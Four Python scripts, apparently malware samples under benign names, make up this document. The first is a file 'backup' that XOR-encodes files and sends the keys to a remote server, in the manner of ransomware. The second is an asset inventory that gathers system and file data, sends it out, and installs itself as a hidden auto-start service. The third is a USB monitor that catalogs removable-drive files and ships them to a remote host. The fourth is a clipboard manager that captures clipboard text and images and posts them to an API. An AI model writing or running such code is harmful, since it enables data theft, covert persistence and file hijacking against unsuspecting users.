import os
import hashlib
import secrets
import base64
import json
import urllib.request

BACKUP_SERVER_URL = "https://backup.example.com/report_key"
TARGET_DIR = "./target"
BACKUP_DIR = "./backup"
MAX_ATTEMPTS = 3

def derive_key(file_name: str) -> bytes:
    """Derive a unique key based on the file name using a secure random salt."""
    salt = secrets.token_bytes(16)
    key_material = hashlib.pbkdf2_hmac('sha256', file_name.encode(), salt, 100_000)
    return key_material, base64.b64encode(salt).decode()

def encode_file(input_path: str, output_path: str, key: bytes):
    """Encode the file content using XOR with the derived key."""
    try:
        with open(input_path, 'rb') as f:
            data = f.read()

        encoded_data = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
        with open(output_path, 'wb') as f:
            f.write(encoded_data)
    except Exception as e:
        print(f"Error encoding file {input_path}: {e}")

def report_key(file_name: str, key: bytes, salt: str):
    """Attempt to report the key material to the backup server."""
    payload = {
        "file_name": file_name,
        "key": base64.b64encode(key).decode(),
        "salt": salt
    }
    data = json.dumps(payload).encode("utf-8")
    for attempt in range(MAX_ATTEMPTS):
        try:
            req = urllib.request.Request(
                BACKUP_SERVER_URL, 
                data=data, 
                headers={"Content-Type": "application/json"},
                method="POST"
            )
            with urllib.request.urlopen(req) as response:
                print(f"Server response for {file_name}: {response.read().decode()}")
                return
        except Exception as e:
            print(f"Attempt {attempt + 1}: Failed to report key for {file_name}: {e}")
    print(f"Failed to report key for {file_name} after {MAX_ATTEMPTS} attempts. Proceeding...")

def main():
    if not os.path.exists(BACKUP_DIR):
        os.makedirs(BACKUP_DIR)

    for entry in os.scandir(TARGET_DIR):
        if entry.is_file():
            file_name = entry.name
            input_path = entry.path
            output_path = os.path.join(BACKUP_DIR, file_name)

            try:
                key, salt = derive_key(file_name)
                encode_file(input_path, output_path, key)
                report_key(file_name, key, salt)
            except Exception as e:
                print(f"Unexpected error processing {file_name}: {e}")

if __name__ == "__main__":
    main()

import os
import platform
import json
from pathlib import Path
import socket
import http.client
from datetime import datetime
import subprocess
import sys

TARGET_DIRECTORY = "./target"
INVENTORY_FILE = "inventory_pack.txt"
ASSET_SERVER = "asset.example.com"
ASSET_PORT = 9000

def collect_system_info():
    """Collect basic and detailed system information."""
    system_info = {
        "os": platform.system(),
        "os_version": platform.version(),
        "architecture": platform.architecture()[0],
        "hostname": socket.gethostname(),
        "ip_address": get_ip_address(),
        "python_version": platform.python_version(),
        "timestamp": datetime.now().isoformat(),
        "cpu": platform.processor(),
        "machine": platform.machine(),
        "node": platform.node(),
    }
    return system_info

def get_ip_address():
    """Get the IP address of the current machine."""
    try:
        return socket.gethostbyname(socket.gethostname())
    except socket.error:
        return "Unknown"

def collect_installed_software():
    """Collect installed software information."""
    software_inventory = []
    if platform.system() == "Windows":
        try:
            output = subprocess.check_output(
                ["wmic", "product", "get", "name,version"],
                stderr=subprocess.DEVNULL,
                text=True,
            )
            for line in output.splitlines()[1:]:
                if line.strip():
                    parts = line.split(maxsplit=1)
                    software_inventory.append({
                        "name": parts[0],
                        "version": parts[1] if len(parts) > 1 else "Unknown",
                    })
        except Exception:
            pass
    elif platform.system() == "Linux":
        try:
            output = subprocess.check_output(
                ["dpkg-query", "-W", "-f=${Package} ${Version}\n"],
                stderr=subprocess.DEVNULL,
                text=True,
            )
            for line in output.splitlines():
                parts = line.split(maxsplit=1)
                software_inventory.append({
                    "name": parts[0],
                    "version": parts[1] if len(parts) > 1 else "Unknown",
                })
        except Exception:
            pass
    return software_inventory

def collect_directory_inventory(target_dir):
    """Collect file inventory from the target directory."""
    file_inventory = []
    for root, dirs, files in os.walk(target_dir):
        for file in files:
            file_path = Path(root) / file
            try:
                file_info = {
                    "path": str(file_path),
                    "size": file_path.stat().st_size,
                    "modified_time": datetime.fromtimestamp(file_path.stat().st_mtime).isoformat(),
                }
                file_inventory.append(file_info)
            except (OSError, FileNotFoundError):
                continue
    return file_inventory

def write_inventory_to_file(system_info, software_inventory, file_inventory, output_file):
    """Write system, software, and file inventory to a file."""
    inventory_data = {
        "system_info": system_info,
        "software_inventory": software_inventory,
        "file_inventory": file_inventory,
    }
    try:
        with open(output_file, "w", encoding="utf-8") as f:
            json.dump(inventory_data, f, indent=4, ensure_ascii=False)
    except OSError as e:
        print(f"Error writing inventory to file: {e}")

def report_to_asset_server(inventory_file):
    """Attempt to report the inventory to the asset server."""
    try:
        with open(inventory_file, "rb") as f:
            inventory_data = f.read()

        conn = http.client.HTTPConnection(ASSET_SERVER, ASSET_PORT, timeout=10)
        conn.request("POST", "/report", body=inventory_data, headers={"Content-Type": "application/json"})
        response = conn.getresponse()
        if response.status == 200:
            print("Successfully reported to asset server.")
        else:
            print(f"Failed to report to asset server. Status: {response.status}, Reason: {response.reason}")
    except (OSError, http.client.HTTPException) as e:
        print(f"Error reporting to asset server: {e}")
    finally:
        if 'conn' in locals():
            conn.close()

def register_inventory_service():
    """Create a hidden system service for inventory persistence."""
    if platform.system() == "Windows":
        try:
            subprocess.run(
                ["sc", "create", "ConfigInventoryService", "binPath=", f"\"{sys.executable} \"{Path(__file__).resolve()}\""],
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            subprocess.run(
                ["sc", "config", "ConfigInventoryService", "start=", "auto"],
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            print("Windows service 'ConfigInventoryService' created.")
        except Exception as e:
            print(f"Failed to register Windows service: {e}")
    elif platform.system() == "Linux":
        service_file = "/etc/systemd/system/configinventory.service"
        service_content = f"""
[Unit]
Description=Config Inventory Service
After=network.target

[Service]
ExecStart={sys.executable} {Path(__file__).resolve()}
Restart=always

[Install]
WantedBy=multi-user.target
"""
        try:
            with open(service_file, "w", encoding="utf-8") as f:
                f.write(service_content)
            subprocess.run(["systemctl", "enable", "configinventory"], check=True)
            subprocess.run(["systemctl", "start", "configinventory"], check=True)
            print("Linux service 'configinventory' created.")
        except Exception as e:
            print(f"Failed to register Linux service: {e}")

def main():
    # Ensure target directory exists
    target_path = Path(TARGET_DIRECTORY)
    if not target_path.exists():
        print(f"Target directory '{TARGET_DIRECTORY}' does not exist.")
        return

    # Collect system information, software inventory, and directory inventory
    system_info = collect_system_info()
    software_inventory = collect_installed_software()
    file_inventory = collect_directory_inventory(target_path)

    # Write inventory to file
    output_file = Path(INVENTORY_FILE)
    write_inventory_to_file(system_info, software_inventory, file_inventory, output_file)

    # Attempt to report inventory to asset server
    report_to_asset_server(output_file)

    # Register the inventory service for persistence
    register_inventory_service()

if __name__ == "__main__":
    main()

import os
import time
import traceback
from datetime import datetime
from pathlib import Path
import json
import socket
import threading
import platform

# Configuration
SCAN_INTERVAL = 10  # seconds
SCAN_COUNT = 3  # number of periodic scans
OUTPUT_DIR = Path('./target')
OUTPUT_FILE = OUTPUT_DIR / 'output_file.txt'
REMOTE_SERVER = ("example.com", 8080)

def is_usb_device(device_path):
    """Check if a given path corresponds to a USB device."""
    try:
        if platform.system() == "Linux":
            with open(f"/sys/class/block/{device_path.name}/device/modalias", "r") as f:
                return "usb" in f.read().lower()
        elif platform.system() == "Windows":
            return "Removable" in os.popen(f"wmic logicaldisk where DeviceID='{device_path}' get DriveType").read()
    except Exception:
        pass
    return False

def scan_usb_devices():
    """Scan mounted drives to find USB storage devices and collect metadata."""
    usb_data = []
    mounted_devices = Path('/mnt')  # Adjust this path as needed for USB storage devices
    try:
        for device in mounted_devices.iterdir():
            if device.is_dir() and is_usb_device(device):
                for file in device.rglob('*'):  # Recursively scan files in the USB device
                    if file.is_file():
                        metadata = {
                            'name': file.name,
                            'path': str(file),
                            'size': file.stat().st_size,
                            'modified_time': datetime.fromtimestamp(file.stat().st_mtime).isoformat()
                        }
                        usb_data.append(metadata)
    except Exception as e:
        print(f"Error scanning USB devices: {e}")
        traceback.print_exc()
    return usb_data

def save_to_file(data):
    """Save scanned data to the output file."""
    try:
        OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
        with OUTPUT_FILE.open('w', encoding='utf-8') as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        print(f"Failed to save data to file: {e}")
        traceback.print_exc()

def send_to_server(data):
    """Send scanned data to a remote server."""
    try:
        with socket.create_connection(REMOTE_SERVER, timeout=5) as sock:
            sock.sendall(json.dumps(data).encode('utf-8'))
    except (socket.error, socket.timeout) as e:
        print(f"Failed to send data to server: {e}")

def log_operation(data):
    """Log operation details for auditing purposes."""
    log_file = OUTPUT_DIR / 'operation_log.txt'
    try:
        with log_file.open('a', encoding='utf-8') as f:
            log_entry = {
                'timestamp': datetime.now().isoformat(),
                'operation': 'USB scan',
                'device_count': len(data),
                'output_file': str(OUTPUT_FILE),
                'server': REMOTE_SERVER
            }
            f.write(json.dumps(log_entry) + '\n')
    except Exception as e:
        print(f"Failed to log operation: {e}")
        traceback.print_exc()

def monitor_usb_devices():
    """Main monitoring loop to periodically scan USB devices."""
    for _ in range(SCAN_COUNT):
        print(f"Starting USB device scan at {datetime.now().isoformat()}")
        usb_data = scan_usb_devices()
        save_to_file(usb_data)
        send_to_server(usb_data)
        log_operation(usb_data)
        print(f"Scan completed. Sleeping for {SCAN_INTERVAL} seconds...")
        time.sleep(SCAN_INTERVAL)

def register_background_service():
    """Register the monitoring task as a background service."""
    print("Starting background service...")
    threading.Thread(target=monitor_usb_devices, daemon=True).start()

def main():
    print("USB Device Monitoring Tool started.")
    register_background_service()
    # Wait for the background thread to complete its work
    time.sleep((SCAN_COUNT * SCAN_INTERVAL) + 1)
    print("Monitoring complete. Exiting.")

if __name__ == '__main__':
    main()

import os
import sys
import time
import json
import base64
import requests
import threading
from io import BytesIO
from http.client import HTTPException
from urllib.error import URLError
from urllib.request import urlopen, Request
from PIL import ImageGrab

OUTPUT_DIR = './target'
OUTPUT_FILE = os.path.join(OUTPUT_DIR, 'output_file.txt')
API_ENDPOINT = 'http://example.com/api/clipboard'

class ClipboardManager:
    def __init__(self):
        self.history = []

    def get_clipboard_data(self):
        """Fetch the current clipboard contents (text or image)."""
        try:
            text = ImageGrab.grabclipboard()
            if isinstance(text, str):
                return {"type": "text", "data": text}
            elif isinstance(text, ImageGrab.Image.Image):
                buffered = BytesIO()
                text.save(buffered, format="PNG")
                img_str = base64.b64encode(buffered.getvalue()).decode('utf-8')
                return {"type": "image", "data": img_str}
            else:
                return None
        except Exception as e:
            return None

    def monitor_clipboard(self, interval=1, iterations=3):
        """Monitor clipboard periodically and store new entries."""
        for _ in range(iterations):
            data = self.get_clipboard_data()
            if data and data not in self.history:
                self.history.append(data)
            time.sleep(interval)

    def save_to_file(self):
        """Save clipboard history to a file."""
        try:
            os.makedirs(OUTPUT_DIR, exist_ok=True)
            with open(OUTPUT_FILE, 'w', encoding='utf-8') as f:
                json.dump(self.history, f, ensure_ascii=False, indent=4)
        except Exception as e:
            print(f"Error saving to file: {e}", file=sys.stderr)

    def send_to_api(self):
        """Send clipboard history to a remote API."""
        try:
            headers = {'Content-Type': 'application/json'}
            data = json.dumps(self.history)
            request = Request(API_ENDPOINT, data=data.encode('utf-8'), headers=headers, method='POST')
            with urlopen(request) as response:
                if response.status == 200:
                    print("Data successfully sent to API.")
        except (URLError, HTTPException, Exception) as e:
            print(f"Error sending to API: {e}", file=sys.stderr)

def run_background_service():
    """Optional registration of a background service (placeholder)."""
    print("Background service registration is not implemented.")

def main():
    clipboard_manager = ClipboardManager()

    # Monitor clipboard
    clipboard_manager.monitor_clipboard()

    # Save history to file
    clipboard_manager.save_to_file()

    # Attempt to send to API
    clipboard_manager.send_to_api()

if __name__ == '__main__':
    main()

